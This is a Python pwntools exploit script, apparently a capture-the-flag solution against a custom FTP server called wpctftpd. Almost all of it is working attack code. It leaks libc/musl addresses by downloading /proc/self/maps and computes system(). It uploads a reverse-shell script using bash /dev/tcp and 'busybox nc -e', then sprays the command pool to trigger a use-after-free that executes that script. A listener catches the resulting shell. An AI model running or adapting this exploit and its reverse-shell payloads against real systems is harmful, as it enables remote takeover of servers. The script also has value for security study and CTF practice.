from matplotlib.pylab import square
from pwn import *
import sys
import select

context.log_level = "info"
context.terminal = ['urxvt', '-e', 'sh', '-c']

CURR_DIR = os.path.dirname(os.path.realpath(__file__))
PATH = CURR_DIR + "/"
BINARY = PATH + "wpctftpd/wpctftpd"

exe = ELF(BINARY)
# libc = ELF(PATH + "./libc-2.28.so")

context.binary = exe.path

# elf = ELF(BINARY, checksec=False)
uu64 = lambda x: u64(x.ljust(8, b"\x00"))
uu32 = lambda x: u32(x.ljust(4, "\x00"))
uu16 = lambda x: u16(x.ljust(4, "\x00"))

LIBC_SYSTEM_OFFSET = 0x2f1e0 # f42
MUSL_SYSTEM_OFFSET = 198924 # alpine:3.19
MUSL_SYSTEM_OFFSET = 293758 # alpine:3.22

gdbscript = '''
handle SIGUSR1 nostop print
handle SIGPIPE nostop print
handle SIGHUP nostop print
#handle SIGSEGV stop print
set follow-fork-mode child
source dump_wp_pool.py
source dump_session.py
#b *wpmalloc+477
#b *cleanup_session+158
#b *cleanup_session
#b *wpfreepool
#b *wpfree
#b *dequeue_cmd_str+232
#b wp_ftp_session.c:201
continue
'''

def attach(r):
    if type(r) == process:
        gdb.attach(r, gdbscript)


class Challenge:

    def __init__(self, host='127.0.0.1', port=2121, client_addr='127.0.0.1', client_port=1025, local_process=True, system_type='f42'):
        self.host = host
        self.port = port
        self.client_port = client_port
        self.client_addr = client_addr
        self.is_connected = False
        self.is_logged_in = False
        self.local_process = local_process
        self.system_type = system_type

        if self.local_process:
            context.log_level = "debug"
            self.p = process([BINARY, '-p', str(self.port)], env={"WPCTFTPD_NO_AUTH": "1"})
            attach(self.p)


    def read_local_process_output(self):
        if self.local_process:
            return self.p.recvall(timeout=2).decode()
        return None

    def connect(self):
        if not self.is_connected:
            self.conn = remote(self.host, self.port, level=context.log_level)
            self.conn.recvuntil(b'220 wpctftpd ready')
            self.is_connected = True

    def login(self, username='test', password='test'):
        self.connect()
        if not self.is_logged_in:
            self.conn.send_raw(f"USER {username}\r\n".encode())
            self.conn.recvuntil(b"331 User name okay, need password")
            self.conn.send_raw(f"PASS {password}\r\n".encode())
            self.conn.recvuntil(b"230 User logged in")
            self.is_logged_in = True

    def open_data_conn_1(self):
        # listen on the specified port
        self.data_conn_1 = listen(self.client_port, level=context.log_level)

    def open_data_conn_2(self):
        # listen on the specified port
        self.data_conn_2 = listen(self.client_port + 1, level=context.log_level)

    def open_data_conn_3(self):
        # listen on the specified port
        self.data_conn_3 = listen(self.client_port + 2, level=context.log_level)

    def close_data_conn_1(self):
        self.data_conn_1.close()

    def close_data_conn_2(self):
        self.data_conn_2.close()

    def send_garbage(self):
        self.data_conn_1.send_raw(b"A" * 4096)
        self.data_conn_1.close()

    def read_all(self):
        return self.conn.recvall(timeout=2).decode()
    
    def send(self, data, read=True):
        self.conn.send_raw(data)
        if read:
            return self.read_all()
        return None

    def close_command_conn(self):
        self.conn.close()
        self.is_connected = False
        self.is_logged_in = False

    def download_file(self, filename):
        self.login()
        self.open_data_conn_2()

        self.conn.send_raw(b"PORT " + ",".join(self.client_addr.split(".")).encode('ascii') + b",4,2\r\n")
        self.conn.recvuntil(b"200 PORT set")

        self.conn.send_raw(f"RETR {filename}\r\n".encode())
        self.conn.recvuntil(b"150 Opening data connection")
        data = self.data_conn_2.recvall(timeout=2)
        self.close_data_conn_2()
        return data


    def upload_file(self, filename, data):
        self.login()
        self.open_data_conn_2()

        self.conn.send_raw(b"PORT " + ",".join(self.client_addr.split(".")).encode('ascii') + b",4,2\r\n")
        self.conn.recvuntil(b"200 PORT set")

        self.conn.send_raw(f"STOR {filename}\r\n".encode())
        self.conn.recvuntil(b"150 Opening data connection")
        self.data_conn_2.send_raw(data)
        self.close_data_conn_2()
        self.conn.recvuntil(b"226 Transfer complete")

    def get_lib_base(self):
        maps = self.download_file("/proc/self/maps").decode()
        # parse the maps to find the lib(c) base address
        lib_base = None
        for line in maps.splitlines():
            if ("libc" in line and "r-xp" in line and self.system_type == 'f42') or ("musl" in line and "r-xp" in line and self.system_type == 'alpine'):
                lib_base = int(line.split()[0].split("-", 1)[0], 16)
                break

        return lib_base

    def get_system_addr(self):
        lib_base = self.get_lib_base()
        if self.system_type == 'alpine':
            return lib_base + MUSL_SYSTEM_OFFSET
        else:
            return lib_base + LIBC_SYSTEM_OFFSET

    def prepare_for_shell(self):
        self.execute(b"chmod *\0")


    def list_files(self):
        self.login()
        self.open_data_conn_2()

        self.conn.send_raw(b"PORT " + ",".join(self.client_addr.split(".")).encode('ascii') + b",4,2\r\n")
        self.conn.recvuntil(b"200 PORT set")

        self.conn.send_raw(b"LIST\r\n")
        self.conn.recvuntil(b"150 Opening data connection")
        data = self.data_conn_2.recvall(timeout=2)
        self.close_data_conn_2()
        return data

    def check_shell(self):
        files = self.list_files().decode()
        for line in files.splitlines():
            if "pwn" in line and "r-x" in line:
                return True


    def data_conn_3_connected(self):
        return self.data_conn_3.can_recv()


    def execute(self, command):
        system_addr = self.get_system_addr()
        debug(f"System address: {hex(system_addr)}")

        shell_content = f"#!/bin/sh\n/bin/bash -i >& /dev/tcp/{self.client_addr}/{self.client_port+2} 0>&1\n"
        if self.system_type == 'alpine':
            shell_content = f"#!/bin/sh\nbusybox nc {self.client_addr} {self.client_port+2} -e /bin/sh\n"
        self.upload_file("pwn", shell_content.encode())

        self.open_data_conn_1()
        self.conn.send_raw(b"PORT " + ",".join(self.client_addr.split(".")).encode('ascii') + b",4,1\r\n")
        self.conn.recvuntil(b"200 PORT set")

        self.conn.send_raw(b"STOR a+x\0\0\r\n")
        self.conn.recvuntil(b"150 Opening data connection")

        self.read_local_process_output()
        self.data_conn_1.send(b"X")

        debug("spray the cmd pool with bad entries")
        sleep(1)
        for i in range(200):
            self.conn.send_raw(command + p64(system_addr) + b"\0BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\r\n")
        
        debug("close command connection and trigger the free of all chunks")
        self.close_command_conn()
        self.data_conn_1.send(b"X")
        debug("close data connection to trigger the use of freed chunk")
        self.data_conn_1.close()
        debug("wait for things to happen...")
        self.read_local_process_output()
        sleep(1)

    def execute_shell(self):
        self.execute(b"./pwn\0\0\0")

def main_exploit(port, system_type='f42'):
    
    #c = Challenge(host='127.0.0.1', client_addr='172.18.0.1', port=2121, client_port=1025+port, local_process=False)
    #c = Challenge(host='127.0.0.1', client_addr='127.0.0.1', port=2121, local_process=True)
    shell_not_obtained = True
    count = 0
    while shell_not_obtained:
        c = Challenge(host='127.0.0.1', client_addr='172.18.0.1', port=2121, client_port=1025+port, local_process=False, system_type='alpine')
        info(f" ---- Attempt #{count} making shell executable...")
        count += 1
        c.prepare_for_shell()
        if c.check_shell():
            shell_not_obtained = False

    success(" !!!! Shell is executable, now try to run it..")
    count = 0
    
    # create new thread that accepts new connections on data_conn_3
    global shell_connected
    shell_connected = False

    rev_shell_thread = threading.Thread(target=accept_reverse_shell, args=(1027,), daemon=True)
    rev_shell_thread.start()
    
    while not shell_connected:
        c = Challenge(host='127.0.0.1', client_addr='172.18.0.1', port=2121, client_port=1025+port, local_process=False, system_type='alpine')
        success(f" ---- Attempt #{count}: Trying to execute shell...")
        c.execute_shell()
        info("check if reverse shell connected...")
        count += 1

    rev_shell_thread.join()
        
def accept_reverse_shell(port):
    s = listen(port, level='error')
    if s.connected():
        global shell_connected
        shell_connected = True
        sleep(1)
        success(" !!!! Reverse shell connected!")
        s.interactive()


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    
    main_exploit(port, system_type='alpine')

